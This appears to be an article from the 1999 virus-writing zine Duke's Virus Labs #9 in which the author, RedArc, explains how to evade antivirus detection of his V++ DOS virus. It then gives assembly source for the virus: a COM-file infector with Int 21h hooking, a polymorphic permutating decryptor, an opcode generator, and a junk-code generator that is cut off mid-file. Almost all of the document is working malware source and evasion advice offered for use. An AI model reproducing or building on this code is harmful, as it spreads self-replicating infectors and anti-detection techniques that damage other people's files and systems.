@@ -1,0 +1,2278 @@
+- [Duke's Virus Labs #9] - [Page 07] -
+
+                            Вирус V++ (версия 3a)
+                                                 by RedArc
+
+     Все  антивирусы  уж  очень  шустро нашли "дыру" в моей логике и научились
+детектировать  и  лечить  вирус  Vpp3.  И  сложилось  впечатление, что все мои
+старания  пошли  коту  под  хвост. Однако это не так. Сейчас я хочу поведать о
+том,  как  из  вируса  Vpp3  можно  сделать почти недетектируемого зверька. Но
+сначала о "дыре" в моей логике.
+     Детектировать  базовый  вирус  не просто, а очень просто. Алгоритм такой:
+считываем  три  первых  байта  программы,  ксорим  ими  последнии  три байта и
+проверяем  что  у  нас  получилось.  Если расксоренные байты 'V++', тогда мы с
+большой  вероятностью можем говорить о том, что нашли вирус. Чтобы убедиться в
+своей  правоте,  смещаемся на размер тушки вируса от конца файла к началу. При
+этом  попадаем  на  статический  декриптор,  который  должен  расшифровываться
+полиморфным  пермутирующим декриптором. Первые байты статического декриптора в
+нешифрованном  виде  нам  известны,  поэтому  довольно  легко  вычислить  ключ
+полиморфного  шифра:  нужно  просто  первые  четыре  байта поксорить с первыми
+четырьмя байтами незашифрованного кода. Как получить байты из незашифрованного
+кода   все   знают   -  ручками.  Получив  таким  образом  ключ,  мы  избегаем
+необходимости  эмулировать  код  полиморфного  декриптора.  Расшифровав n-байт
+декриптора,  можно  подсчитать CRC расшифрованного участка и уже утвердительно
+ответить  на  вопрос  о том, нашли мы вирус или совпадение байт начала и конца
+программы.  Кстати,  всегда полезно представлять себе как работают антивирусы,
+чтобы наиболее эффективно использовать их ограничения.
+     Итак,  что же мы имеем для начала усовершенствования зверушки? А вот что:
+необходимо  сделать  так, чтобы антивирус не смог спозиционироваться на начало
+статического декриптора. Сделать это не просто, а очень просто.
+     Мы  знаем,  что вирус не ищет собственного смещения таким образом, а лишь
+проверяет  последнии  три  байта  кода инфицированной программы. Вот этим мы и
+воспользуемся.  Вирусу  абсолютно  по  барабану, что записано перед последними
+тремя  байтами  -  зашифрованная  тушка  вируса  или  мусорные  байты,  а  вот
+антивирусу  не  по  барабану.  Посему,  перед  записью  метки инфицированности
+достаточно  дописать  к  заражаемой  программе  случайное количество случайных
+байт  и  дело  в шляпе. Что вы будете подразумевать под словом "случайность" -
+это  ваше  дело.  Для  примера  я  взял  случайное  количество  байт  из самой
+инфицированной  программы  и  дописал их перед меткой вируса. Пара движений по
+клавиатуре и вирус перестал детектироваться!
+     Что  еще можно посоветовать для усовершенствования? Ну во первых, сделать
+"плавающую точку перехода" более корректно. Как это сделать написано в журнале
+SD#1.  Алгоритм  полиморфного  декриптора  прост до безобразия. Лучше воткнуть
+что-нибудь  поинтереснее  (ror,  rol,  sub,  add,  ...). Первое, что послужило
+сигнатурой - статический декриптор. Если сделать его код полиморфным с помощью
+даже самой простой ангины, то детектирование этого вируса станет уже совсем не
+тривиальной задачей. Ну а если заменить статический декриптор обработкой тушки
+вируса  с  помощью VCG, тогда г-н Данилов скорее всего съест собственную шляпу
+нежели  сможет детектировать зверька. И еще. Поскольку алгоритм детектирования
+сильно  связан  с меткой, то ее так же необходимо сделать полиморфной. Как это
+сделать - вы можете прочитать в журнале MB#11.
+     Да,  вот еще чего, пока я проверял правильность моих мыслей, то наткнулся
+на  одну багу... Если вирус не нашел себе жертву (не инфицировал ничего), то в
+большинстве  случаев  это  приводит к завису компа или к прибиванию ДОС-окна в
+случае  Windows.  Если  же  жертва  была найдена и успешно инфицирована, тогда
+вероятность возникновения ошибки стремится к нулю. Нахождение этой тривиальной
+ошибки  я оставляю читателям этой статьи, у которых бьется экспериментаторская
+жилка ;)
+
+
+===== begin main.asm =====
+; V++ полуморфик для третьего тура конкурса на лучший антивирус
+; (c) 1999 by RedArc
+
+IntConst equ 3h
+
+Model Tiny
+.code
+.386
+org 100h
+start:
+;Начальные байты программы
+       db 100h dup (90h)
+;В точке, где нашли IntXX
+Resume equ $-start
+MyLabel:
+       jmp @VirusStart
+;Окончание программы
+       db 100h dup (90h)
+       int 20h
+;---
+;!!! отсюда в произвольном порядке размещаются блоки декриптора
+@VirusStart:
+       nop
+       db 068h     ;Сохранение в стэке адреса возврата
+       dw 100h
+       nop         ;Случайное количество байт мусор первого рода
+       pushf
+       nop         ;Случайное количество байт мусор первого рода
+       pusha
+       nop         ;Случайное количество байт мусор первого рода
+       push ds
+       nop         ;Случайное количество байт мусор первого рода
+       push es
+       nop         ;Случайное количество байт мусор первого рода
+       push cs
+       nop         ;Случайное количество байт мусор первого рода
+       push cs
+       nop         ;Случайное количество байт мусор первого рода
+       pop ds
+       nop         ;Случайное количество байт мусор первого рода
+       pop es
+       nop         ;Случайное количество байт мусор первого рода
+;!!! ДРОППЕР !!!
+       jmp EntryPoint
+;!!! ДРОППЕР !!!
+
+       jmp L0 ;переход на следующий блок
+       nop         ;Случайное количество байт мусор первого рода
+;---
+L0:
+       nop         ;Случайное количество байт мусор первого рода
+       push offset EntryPoint ;Пихаем в стек адрес перехода после дешифровки
+       nop         ;Случайное количество байт мусор первого рода
+       jmp @a
+       nop         ;Случайное количество байт мусор первого рода
+;---
+@a:
+       nop
+       push offset L1 ;Адрес начала цикла, случайное количество раз
+       nop         ;Случайное количество байт мусор первого рода
+       jmp @b
+       nop         ;Случайное количество байт мусор первого рода
+;---
+@b:
+       nop         ;Случайное количество байт мусор первого рода
+       push offset L1 ;Адрес начала цикла, случайное количество раз
+       nop         ;Случайное количество байт мусор первого рода
+       jmp @c
+       nop         ;Случайное количество байт мусор первого рода
+;---
+@c:
+       nop
+       mov bx,1234h ;Начальный ключ дешифровки. Случайное число
+       nop         ;Случайное количество байт мусор первого рода
+       jmp L1
+       nop         ;Случайное количество байт мусор первого рода
+;---
+L1:
+       nop         ;Случайное количество байт мусор первого рода
+       mov si,offset EntryPoint
+       nop         ;Случайное количество байт мусор первого рода
+       jmp @d
+       nop         ;Случайное количество байт мусор первого рода
+;---
+@d:
+       nop         ;Случайное количество байт мусор первого рода
+       mov cx, VirLength / 2
+       nop         ;Случайное количество байт мусор первого рода
+       jmp @e
+       nop         ;Случайное количество байт мусор первого рода
+;---
+@e:
+       nop         ;Случайное количество байт мусор первого рода
+       mov di,si
+       nop         ;Случайное количество байт мусор первого рода
+       jmp L2
+       nop         ;Случайное количество байт мусор первого рода
+;---
+L2:
+       nop         ;Случайное количество байт мусор первого рода
+       lodsw
+       nop         ;Случайное количество байт мусор первого рода
+       jmp @f
+       nop         ;Случайное количество байт мусор первого рода
+;---
+@f:
+       nop         ;Случайное количество байт мусор первого рода
+       xor ax,bx
+       nop         ;Случайное количество байт мусор первого рода
+       jmp @g
+       nop         ;Случайное количество байт мусор первого рода
+;---
+@g:
+       nop         ;Случайное количество байт мусор первого рода
+       stosw
+       nop         ;Случайное количество байт мусор первого рода
+       jmp @h
+       nop         ;Случайное количество байт мусор первого рода
+;---
+@h:
+       nop         ;Случайное количество байт мусор первого рода
+       dec cx
+       nop         ;Случайное количество байт мусор первого рода
+       jmp @i
+       nop         ;Случайное количество байт мусор первого рода
+;---
+@i:
+       nop         ;Случайное количество байт мусор первого рода
+       cmp cx,0
+       je @i1
+       nop         ;Однобайтовая случайная команда
+       xor bx,1234h
+       nop         ;Однобайтовая случайная команда
+       jmp L2
+       nop         ;Однобайтовая случайная команда
+@i1:
+       jmp L3
+       nop         ;Случайное количество байт мусор первого рода
+;---
+L3:
+       nop         ;Случайное количество байт мусор первого рода
+       xor bx,4321h
+       nop         ;Случайное количество байт мусор первого рода
+       ret
+       nop         ;Случайное количество байт мусор первого рода
+;---
+;!!! Осюда начинается зашифрованная часть кода
+EntryPoint:
+;!!! Статический декриптор со случайным ключем
+; Это нужно для того, чтобы ключ в полидекрипторе был случайным
+       call $+3
+       cld
+       mov si,CryptStart
+       pop bp
+KeyStat equ $-EntryPoint
+       db 0bbh ;Случайный ключ для статического декриптора
+       dw 0
+       sub bp,3
+       add si,bp
+       mov cx,CryptLength / 2
+       mov di,si
+@EP_Start:
+       lodsw
+       not ax
+       xor ax,bx
+       not ax
+       stosw
+       loop @EP_Start
+CryptStart equ $-EntryPoint
+;---
+@CS:
+       call IntExchange
+;***
+       mov ax,2501h
+       lea dx,[bp+@TestFile]
+       int IntConst
+;***
+GET_DTA:
+       mov ah,2fh
+       int IntConst     ;Получить DTA программы
+SAVE_DTA:
+       mov ax,es
+       mov word ptr ds:[bp+DTA_SEG],ax ;Сохранить сегмент DTA программы
+       mov word ptr ds:[bp+DTA_OFS],bx ;Сохранить смещение DTA программы
+       push cs
+       pop es      ;Восстановить значение сегмента ES
+SET_DTA_VIR:
+       lea dx,[bp+DTA_NEW]
+       mov ah,1ah
+       int IntConst     ;Установить DTA вируса
+RESTORE_3_BYTES:  ;Восстановление спрятанных байт программы
+       lea si,[bp+OLD_BYTES]
+       mov di,word ptr ds:[bp+JMP_OFS]
+       movsw
+       movsb
+FIND_FIRST:
+       mov ah,4eh
+       lea dx,[bp+FileMask]
+       mov cx,0feh ;Поиск первого файла по шаблону
+Interrupt:
+       int IntConst
+       jb NotFile
+;***
+       int 1h
+;       call TestFile
+;***
+       mov ah,4fh
+       jmp short Interrupt
+NotFile: ;Ну делать нечего... пора отдавать брозды правления.
+       mov ax,word ptr ds:[bp+DTA_SEG]
+       mov ds,ax
+       mov dx,word ptr ds:[bp+DTA_OFS]
+       mov ah,1ah
+       int IntConst
+       pop es
+       call IntExchange
+       pop ds
+       popa
+       popf
+       ret
+;---
+IntExchange: ;Обмен векторов 21h и 3h
+       xor ax,ax
+       mov ds,ax
+       cli
+       xchg word ptr ds:[21h*4],ax
+       xchg word ptr ds:[IntConst*4],ax ;Это скажите спасибо CrkV - это все он... ;)
+       xchg word ptr ds:[21h*4],ax
+       xchg word ptr ds:[21h*4+2],ax
+       xchg word ptr ds:[IntConst*4+2],ax
+       xchg word ptr ds:[21h*4+2],ax
+       sti
+       push cs
+       pop ds
+       ret
+;---
+@TestFile equ $-EntryPoint
+TestFile: ;Проверка найденного файла на соответствие критериям вируса
+       pop ax
+       pop cx
+       pop cx
+       push ax
+       mov ax,word ptr ds:[bp+DTA_NEW+1ch]
+       cmp ax,0
+       jne ExitTest ;Больше 65536 байт
+       mov ax,word ptr ds:[bp+DTA_NEW+1ah]
+       cmp ax,1024
+       jle ExitTest ;Слишком мал
+       cmp ax,40*1024
+       jnb ExitTest ;Слишком велик
+       xor cx,cx
+       call SetFAttr ;Очищаем атрибуты файла
+       jc ExitTest ;Не можем изменить атрибуты
+       mov ax,3d02h
+       int IntConst ;Открываем файл на чтение/запись
+       jc ExitTest ;Открыть не можем
+       xchg bx,ax ;Сохраняем Handle
+       mov ah,3fh
+       lea dx,[bp+Reserv]
+       mov cx,3
+       int IntConst ;Читаем первых три байта файла - это ключ для расшифровки метки
+       jc CloseFile ;Прочитать не можем
+       lea si,[bp+Reserv]
+       lodsw
+       cmp ax,'MZ'
+       je CloseFile ;Это EXE-программа с COM-расширением
+       cmp ax,'ZM'
+       je CloseFile
+       mov dx,word ptr ds:[bp+DTA_NEW+1ah]
+       sub dx,3
+       call GoToBegin ;Уходим за три байта от конца файла
+       jc CloseFile ;Ну уж я не знаю, почему не смогли
+       mov ah,3fh
+       lea dx,[bp+OLD_BYTES]
+       mov cx,3
+       int IntConst ;Читаем последнии три байта файла - это может быть нашей меткой
+       jc CloseFile ;Это наверное чтобы CrkV к нам не приставал ;)
+       mov ax,word ptr ds:[bp+OLD_BYTES]
+       mov cx,word ptr ds:[bp+Reserv]
+       xor ah,ch
+       xor al,cl
+       cmp ax,'+V'
+       je CloseFile ;Уже инфецирован
+       call InfectFile ;Вот как раз то, что мы искали
+CloseFile:
+       mov ax,5701h
+       mov cx,word ptr ds:[bp+DTA_NEW+16h]
+       mov dx,word ptr ds:[bp+DTA_NEW+18h]
+       int IntConst ;Восстановим дату/время файла
+       jc ExitTest ;Не смогли :(
+       mov ah,3eh
+       int IntConst ;Закроем файл
+       jc ExitTest ;Опять не смогли :(
+       xor cx,cx
+       mov cl,byte ptr ds:[bp+DTA_NEW+15h]
+       call SetFAttr ;Восстановим атрибуты файла
+ExitTest:
+       ret ;Ищем следующий
+;---
+InfectFile: ;Инфецирование найденного файла
+       mov dx,0
+       call GoToBegin ;Уходим в начало файла
+       lea dx,[bp+Buffer]
+       mov cx,1024
+       mov ah,3fh
+       int IntConst ;Читаем первый килобайт файла в буфер
+       call FindSpace ;Ищем место для внедрения
+       cmp di,0ffffh
+       jne InfectToSpace  ;Нашли тепленькое местечко
+       lea di,[bp+Buffer] ;Бум писать переход в начало файла
+InfectToSpace:
+       push di
+       lea si,[bp+OLD_BYTES]
+       xchg si,di
+       movsw
+       movsb ;Сохраняем байты программы, которые заменим своими
+       pop di
+       sub di,Buffer
+       sub di,bp
+       call InfectedInToSpace ;Инфецирование
+       ret
+;---
+FindSpace: ;Поиск Int 10h / Int 21h в первом килобайте файла
+       push ax bx cx dx
+       lea si,[bp+MInt10h]
+       lea di,[bp+Buffer]
+       mov cx,1024
+       mov bx,2
+       call concatenat_string_in_memory ;Ищем Int 10h
+       cmp di,0ffffh
+       jne OkFindSpace ;Нашли, однако ;)
+       lea si,[bp+MInt21h]
+       lea di,[bp+Buffer]
+       mov cx,1024
+       mov bx,2
+       call concatenat_string_in_memory ;Ищем Int 21h
+OkFindSpace:
+       pop dx cx bx ax
+       ret
+;---
+InfectedInToSpace:
+       mov dx,di
+       call GoToBegin ;Уходим на найденное место в файле
+       mov ax,word ptr ds:[bp+DTA_NEW+1ah]
+       sub ax,di
+       sub ax,3 ;Калькулируем адрес перехода на начало полидекриптора
+       lea si,[bp+Reserv]
+       mov byte ptr ds:[si],0e9h
+       mov word ptr ds:[si+1],ax ;Калькулируем команду перехода
+       mov ax,di
+       add ax,100h
+       mov word ptr ds:[bp+JMP_OFS],ax ;Сохраняем смещение в памяти команды
+       xchg dx,si
+       mov ah,40h
+       mov cx,3
+       int IntConst ;Записываем команду перехода на полидекриптор
+CalcNewVirus: ;Будем делать новую тушку вируса
+       call ZerroBuffer ;Очищаем буфер для хранения смещений блоков
+;---
+       lea di,[bp+Buffer]
+       call Musor
+       call CalcPoly
+;---
+       call GoToEnd ;Уходим в конец файла
+       lea dx,[bp+Buffer]
+       mov cx,di
+       sub cx,dx
+       mov ah,40h
+       int IntConst ;Записываем полидекриптор
+;---
+       push si di
+       mov ax,word ptr ds:[bp+DTA_NEW+1ah]
+       inc ah
+       mov si,word ptr ds:[bp-IndexBuff]
+       lea di,[bp+Buffer]
+       sub si,di
+       add ax,si ;В регистре AX смещение точки входа в полидекриптор
+       mov dx,word ptr ds:[bp+JMP_OFS] ;Смещение команды JMP Virus
+       sub ax,dx
+       sub ax,3 ;Новый адрес перехода на точку входа в полидекриптор
+       mov word ptr ds:[bp+VirLength],ax
+       dec dh
+       inc dl   ;Адрес перехода в файле
+       call GoToBegin
+       lea dx,[bp+VirLength]
+       mov cx,2
+       mov ah,40h
+       int IntConst ;Записываем адрес точки входа в полидекриптор
+       pop di si
+;---
+       call GoToEnd ;Уходим в конец файла
+;Калькулируем новый ключ для статического декриптора
+       push bx
+       call _Calc_Rnd16
+       mov word ptr ds:[bp+TabelleKeys+6],bx
+       mov word ptr ds:[bp+KeyStat+1],bx
+;Записываем в буфер тушку
+       cld
+       mov si,bp
+       lea di,[bp+Buffer]
+       mov cx,VirLength
+       rep movsb
+;Шифруем тушку статическим декриптором
+       lea di,[bp+Buffer+CryptStart]
+       mov si,di
+       mov cx,CryptLength / 2
+@EP_Start1:
+       lodsw
+       not ax
+       xor ax,bx
+       not ax
+       stosw
+       loop @EP_Start1
+;Шифруем буфер ключами от полидекриптора
+;- Вычисляем ключ
+PPoly0:
+       mov ax,2
+       push ax
+       mov bx,word ptr ds:[bp+TabelleKeys]
+PPoly1:
+       mov cx,VirLength / 2
+PPoly2:
+       mov ax,word ptr ds:[bp+TabelleKeys+2]
+       xor bx,ax
+       loop PPoly2
+       pop ax
+       cmp ax,0
+       je PPoly3
+       dec ax
+       push ax
+       mov ax,word ptr ds:[bp+TabelleKeys+4]
+       xor bx,ax
+       jmp PPoly1
+;- Кодируем
+PPoly3:
+       mov ax,2
+       push ax
+PPolyL0:
+       lea si,[bp+Buffer]
+       mov di,si
+       mov cx,VirLength / 2
+PPolyL1:
+       lodsw
+       xor ax,bx
+       stosw
+       mov ax,word ptr ds:[bp+TabelleKeys+2]
+       xor bx,ax
+       loop PPolyL1
+       pop ax
+       cmp ax,0
+       je PPolyL_1
+       dec ax
+       push ax
+       mov ax,word ptr ds:[bp+TabelleKeys+4]
+       xor bx,ax
+       jmp PPolyL0
+PPolyL_1:
+;Записываем буфер в файл
+       pop bx
+       call GoToEnd ;Уходим в конец файла
+       mov cx,VirLength
+       lea dx,[bp+Buffer]
+       mov ah,40h
+       int IntConst
+;Считываем первые три байта файла
+       sub dx,dx
+       call GoToBegin
+       mov ah,3fh
+       lea dx,[bp+Reserv]
+       mov cx,3
+       int IntConst ;Читаем первых три байта файла - это ключ для шифровки метки
+;Кодируем метку
+       lea si,[bp+Reserv]
+       mov di,si
+       lodsb
+       xor al,'V'
+       stosb
+       lodsb
+       xor al,'+'
+       stosb
+       lodsb
+       xor al,'+'
+       stosb
+;Записываем метку в конец файла
+       call GoToEnd ;Уходим в конец файла
+       call WriteEnd
+       mov ah,40h
+       lea dx,[bp+Reserv]
+       mov cx,3
+       int IntConst ;Записываем метку вируса
+;Выход
+       ret
+;---
+WriteEnd:
+       mov ah,0ffh
+       call RND_Tabelle
+       xor ax,ax
+       xchg cl,ah
+       mov ah,40h
+       lea dx,[bp-256]
+       int IntConst
+       ret
+;---
+include musor.inc
+include find.inc
+include service.inc
+include poly.inc
+include permut.inc
+;---
+;А это я решил немного приколоться. Нет, ну правда. Должно быть весело ;)
+db ' Jedem das Seinem '
+;---
+;!!! Данные вируса
+MInt10h equ   $-EntryPoint
+       int 10h
+MInt21h equ   $-EntryPoint
+       int 21h
+FileMask equ  $-EntryPoint
+       db '*.com',0h
+DTA_SEG equ   $-EntryPoint
+       dw ?
+DTA_OFS equ   $-EntryPoint
+       dw ?
+JMP_OFS equ   $-EntryPoint
+       dw Resume + 100h
+OLD_BYTES equ $-EntryPoint
+        int 20h
+        db 90h
+;---
+CryptLength equ $-@CS
+VirLength equ $-EntryPoint
+;!!! Конец тела вируса и идентификатор зараженности файла
+db 12 dup (?)
+Ident: db 'V' xor 90h, '+' xor 90h, '+' xor 90h
+;---
+;!!! Динамические данные вируса
+;---
+Reserv equ    $-EntryPoint
+       db 3 dup (?)
+;---
+DTA_NEW equ   $-EntryPoint
+       db 80h dup (?)
+;---
+Buffer equ    $-EntryPoint
+end start
+
+===== end   main.asm =====
+
+===== begin code16.inc =====
+;Codegenerator (c) 1999 by RedArc
+
+;Генератор команд с 16-битными регистрами
+
+;---NumReg16 Tabelle
+;numreg|  0  1  2  3  4  5  6  7
+;regs16|  AX CX DX BX SP BP SI DI
+
+;---R2 of R1 Tabelle
+;code| C0 C1 C2 C3 C4 C5 C6 C7 | C8 C9 CA CB CC CD CE CF
+; R2 | AX CX DX BX SP BP SI DI | AX CX DX BX SP BP SI DI
+; R1 |            AX           |            CX
+;-------------------------------------------------------
+;code| D0 D1 D2 D3 D4 D5 D6 D7 | D8 D9 DA DB DC DD DE DF
+; R2 | AX CX DX BX SP BP SI DI | AX CX DX BX SP BP SI DI
+; R1 |            DX           |            BX
+;-------------------------------------------------------
+;code| E0 E1 E2 E3 E4 E5 E6 E7 | E8 E9 EA EB EC ED EE EF
+; R2 | AX CX DX BX SP BP SI DI | AX CX DX BX SP BP SI DI
+; R1 |            SP           |            BP
+;-------------------------------------------------------
+;code| F0 F1 F2 F3 F4 F5 F6 F7 | F8 F9 FA FB FC FD FE FF
+; R2 | AX CX DX BX SP BP SI DI | AX CX DX BX SP BP SI DI
+; R1 |            SI           |            DI
+
+;-----------------------
+;Input:  ah - range
+;Output: ah - rnd
+RND_Tabelle:
+       mov al,ah
+       in al,40h
+       cmp al,ah
+       jnc RND_Tabelle
+       xchg ah,al
+       ret
+;-----------------------
+_al:
+       stosb
+       ret
+_bx:
+       mov word ptr ds:[di],bx
+       add di,2
+       ret
+_al_bx:
+       call _al
+       call _bx
+       ret
+_bl:
+       mov byte ptr ds:[di],bl
+       inc di
+       ret
+_ax_bx:
+       stosw
+       call _bx
+       ret
+;---
+;Input:  none
+;Output: bx - Rnd16
+_Calc_Rnd16:
+         push ax
+         mov ah,0ffh
+         call RND_Tabelle
+         mov al,ah
+         push ax
+         mov ah,0ffh
+         call RND_Tabelle
+         xchg bx,ax
+         pop ax
+         mov bl,al
+         pop ax
+         ret
+;---
+;Input:  bl - reg1num
+;Output: bh - reg2num
+_Calc_Rnd_R16:
+         push ax
+_Case1:
+         mov ah,7
+         call RND_Tabelle
+         mov bh,ah
+         cmp bl,bh
+         je _Case1
+         cmp ah,4
+         je _Case1
+         pop ax
+         ret
+;---
+
+;-----------------------
+;Input:  bl - numreg
+;Output: bl - code
+Push_Reg16_Tabelle:
+       add bl,50h
+       ret
+;-----------------------
+;Input:  bl - numreg
+;Output: bl - code
+Pop_Reg16_Tabelle:
+       add bl,58h
+       ret
+;-----------------------
+;Input:  bl - numreg
+;        ax - value16
+;Output: ax:bx - code
+Add_Reg16_Value16_Tabelle:
+       add bl,0c0h
+       mov bh,081h
+       xchg bh,bl
+       xchg bx,ax
+       ret
+;-----------------------
+;Input:  bl - numreg
+;        ax - value16
+;Output: ax:bx - code
+Sub_Reg16_Value16_Tabelle:
+       add bl,0e8h
+       mov bh,081h
+       xchg bh,bl
+       xchg bx,ax
+       ret
+;-----------------------
+;Input:  bl - numreg
+;        ax - value8
+;Output: al:bx - code
+Add_Reg16_Value8_Tabelle:
+       add bl,0c0h
+       mov bh,al
+       mov al,083h
+       ret
+;-----------------------
+;Input:  bl - numreg
+;        ax - value8
+;Output: al:bx - code
+Sub_Reg16_Value8_Tabelle:
+       add bl,0e8h
+       mov bh,al
+       mov al,083h
+       ret
+;-----------------------
+;Input:  bl - numreg1
+;        bh - numreg2
+;Output: bl - code
+;Remark: used for AddR1R2, SubR1R2, ...
+CalculCodeR2ofR1:
+         push ax cx dx
+         mov al,bl
+         mov cx,8
+         mul cx
+         add al,bh
+         xchg bx,ax
+         add bl,0c0h
+         pop dx cx ax
+         ret
+;-----------------------
+;Input:  bl - numreg1
+;        bh - numreg2
+;Output: bx - code
+Add_Reg1_Reg2_16_Tabelle:
+         call CalculCodeR2ofR1
+         mov bh,003h
+         xchg bh,bl
+         ret
+;-----------------------
+;Input:  bl - numreg1
+;        bh - numreg2
+;Output: bx - code
+Sub_Reg1_Reg2_16_Tabelle:
+         call CalculCodeR2ofR1
+         mov bh,02bh
+         xchg bh,bl
+         ret
+;-----------------------
+;Input:  bl - numreg1
+;        bh - numreg2
+;Output: bx - code
+Xor_Reg1_Reg2_16_Tabelle:
+         call CalculCodeR2ofR1
+         mov bh,033h
+         xchg bh,bl
+         ret
+;-----------------------
+;Input:  bl - numreg
+;        bh - value8
+;Output: al:bx - code
+Xor_Reg16_Value8_Tabelle:
+         add bl,0f0h
+         mov al,083h
+         ret
+;-----------------------
+;Input:  bl - numreg
+;        ax - value16
+;Output: ax:bx - code
+Xor_Reg16_Value16_Tabelle:
+         add bl,0f0h
+         mov bh,081h
+         xchg bh,bl
+         xchg bx,ax
+         ret
+;-----------------------
+;Input:  bl - numreg1
+;        bh - numreg2
+;Output: bx - code
+Mov_Reg1_Reg2_16_Tabelle:
+         call CalculCodeR2ofR1
+         mov bh,08bh
+         xchg bh,bl
+         ret
+;-----------------------
+;Input:  bl - numreg
+;        ax - value16
+;Output: al:bx - code
+Mov_Reg16_Value16_Tabelle:
+         add bl,0b8h
+         xchg bx,ax
+         ret
+;-----------------------
+;Input:  bl - numreg1
+;        bh - numreg2
+;Output: bx - code
+Xchg_Reg1_Reg2_16_Tabelle:
+         call CalculCodeR2ofR1
+         mov bh,087h
+         xchg bh,bl
+         ret
+;-----------------------
+;Input:  bl - numreg
+;Output: bl - code
+Inc_Reg16_Tabelle:
+         add bl,040h
+         ret
+;-----------------------
+;Input:  bl - numreg
+;Output: bl - code
+Dec_Reg16_Tabelle:
+         add bl,048h
+         ret
+;-----------------------
+;Input:  bl - numreg
+;        bh - value8
+;Output: al:bx - code
+Or_Reg16_Value8_Tabelle:
+         add bl,0c8h
+         mov al,083h
+         ret
+;-----------------------
+;Input:  bl - numreg
+;        ax - value16
+;Output: ax:bx - code
+Or_Reg16_Value16_Tabelle:
+         add bl,0c8h
+         mov bh,081h
+         xchg bh,bl
+         xchg bx,ax
+         ret
+;-----------------------
+;Input:  bl - numreg1
+;        bh - numreg2
+;Output: bx - code
+Or_Reg1_Reg2_16_Tabelle:
+         call CalculCodeR2ofR1
+         mov bh,00bh
+         xchg bh,bl
+         ret
+;-----------------------
+===== end   code16.inc =====
+
+===== begin find.inc =====
+;Поиск строки в памяти (c) 1999 by RedArc
+
+;ВХОД:
+;DS:SI - АДРЕС ИСКОМОЙ СТРОКИ
+;ES:DI - АДРЕС ДЛЯ ПОИСКА
+;CX - КОЛИЧЕСТВО БАЙТ ДЛЯ СРАВНЕНИЯ
+;BX - ДЛИНА ИСКОМОЙ СТРОКИ
+;ВЫХОД:
+;DI    - СМЕЩЕНИЕ В СЕГМЕНТЕ ЕСЛИ НАШЛИ, В ПРОТИВНОМ СЛУЧАЕ 0FFFFH
+concatenat_string_in_memory:
+             push ax bx cx dx
+             cld
+             mov al,byte ptr ds:[si]
+next_find_string:
+             repne scasb
+             je found_first_char
+             mov di,0ffffh
+             jmp end_find_string
+found_first_char:
+             push cx
+             push di
+             push si
+             mov cx,bx
+             dec di
+             repe cmpsb
+             je found_string
+             pop si
+             pop di
+             pop cx
+             jmp next_find_string
+found_string:
+             pop si
+             pop di
+             dec di
+             pop cx
+end_find_string:
+             pop dx cx bx ax
+             ret
+===== end   find.inc =====
+
+===== begin musor.inc =====
+;Генератор мусорных команд (c) 1999 by RedArc
+;DS:DI - буфер
+
+;------------------------------------
+; Диспетчер случайно выбираемых блоков
+Musor:
+     push ax bx cx dx si
+     xor cx,cx
+     mov ah,3
+     call RND_Tabelle
+     cmp ah,0
+     je MI_END
+     mov cl,ah
+MI_A:
+     push cx
+     mov ax,@MI_B
+     add ax,bp
+     push ax
+     mov ah,51
+     call RND_Tabelle
+     sub al,al
+     xchg ah,al
+     shl ax,1
+     lea si,[bp+TabelleMusor]
+     add si,ax
+     mov ax,word ptr ds:[si]
+     add ax,bp
+     push ax
+     ret
+@MI_B equ $-EntryPoint
+MI_B:
+     pop cx
+     loop MI_A
+MI_END:
+     pop si dx cx bx ax
+     ret
+;---
+TabelleMusor equ $-EntryPoint
+dw @MI0,  @MI1,  @MI2,  @MI3,  @MI4,  @MI5,  @MI6,  @MI7,  @MI8,  @MI9
+dw @MI10, @MI11, @MI12, @MI13, @MI14, @MI15, @MI16, @MI17, @MI18, @MI19
+dw @MI20, @MI21, @MI22, @MI23, @MI24, @MI25, @MI26, @MI27, @MI28, @MI29
+dw @MI30, @MI31, @MI32, @MI33, @MI34, @MI35, @MI36, @MI37, @MI38, @MI39
+dw @MI40, @MI41, @MI42, @MI43, @MI44, @MI45, @MI46, @MI47, @MI48, @MI49
+dw @MI50, @MI51
+;---
+@MI0 equ $-EntryPoint
+MI0: ;нет мусора
+     ret
+@MI1 equ $-EntryPoint
+MI1: ;nop
+     mov al,90h
+     stosb
+     ret
+@MI2 equ $-EntryPoint
+MI2: ;std / cld
+     mov ax,0fcfdh
+     stosw
+     ret
+@MI3 equ $-EntryPoint
+MI3: ;push R / call $+3 / pop R / pop R
+     mov bl,8
+     call _Calc_Rnd_R16
+     mov bl,bh
+     call Push_Reg16_Tabelle
+     mov al,bl
+     stosb
+     call MI_NOP
+     mov al,0e8h
+     stosb
+     xor ax,ax
+     stosw
+     mov bl,bh
+     call Pop_Reg16_Tabelle
+     mov al,bl
+     stosb
+     call MI_NOP
+     mov bl,bh
+     call Pop_Reg16_Tabelle
+     xchg bl,al
+     stosb
+     ret
+@MI4 equ $-EntryPoint
+MI4: ;fs:
+     mov al,064h
+     stosb
+     call MI_MUS
+     ret
+@MI5 equ $-EntryPoint
+MI5: ;gs:
+     mov al,065h
+     stosb
+     call MI_MUS
+     ret
+@MI6 equ $-EntryPoint
+MI6: ;ds:
+     mov al,067h
+     stosb
+     call MI_MUS
+     ret
+@MI7 equ $-EntryPoint
+MI7: ;cs:
+     mov al,02eh
+     stosb
+     call MI_MUS
+     ret
+@MI8 equ $-EntryPoint
+MI8: ;es:
+     mov al,026h
+     stosb
+     call MI_MUS
+     ret
+@MI9 equ $-EntryPoint
+MI9: ;jmps $+2
+     mov ax,00ebh
+     stosw
+     ret
+@MI10 equ $-EntryPoint
+MI10: ;jmp $+3
+     mov al,0e9h
+     stosb
+     xor ax,ax
+     stosw
+     ret
+@MI11 equ $-EntryPoint
+MI11: ; push ax / cbw /pop ax
+     mov bx,0
+     call Push_Reg16_Tabelle
+     mov al,bl
+     stosb
+     call MI_MUS
+     mov al,098h
+     stosb
+     call MI_MUS
+     mov bl,bh
+     call Pop_Reg16_Tabelle
+     xchg bl,al
+     stosb
+     ret
+@MI12 equ $-EntryPoint
+MI12: ;cli / sti
+     mov ax,0fbfah
+     stosw
+     ret
+@MI13 equ $-EntryPoint
+MI13: ;cmc / cmc
+     mov ax,0f5f5h
+     stosw
+     ret
+@MI14 equ $-EntryPoint
+MI14: ;push dx / cwd / pop dx
+     mov bl,2
+     call Push_Reg16_Tabelle
+     mov al,bl
+     stosb
+     call MI_MUS
+     mov al,099h
+     stosb
+     call MI_MUS
+     mov bl,2
+     call Pop_Reg16_Tabelle
+     xchg bl,al
+     stosb
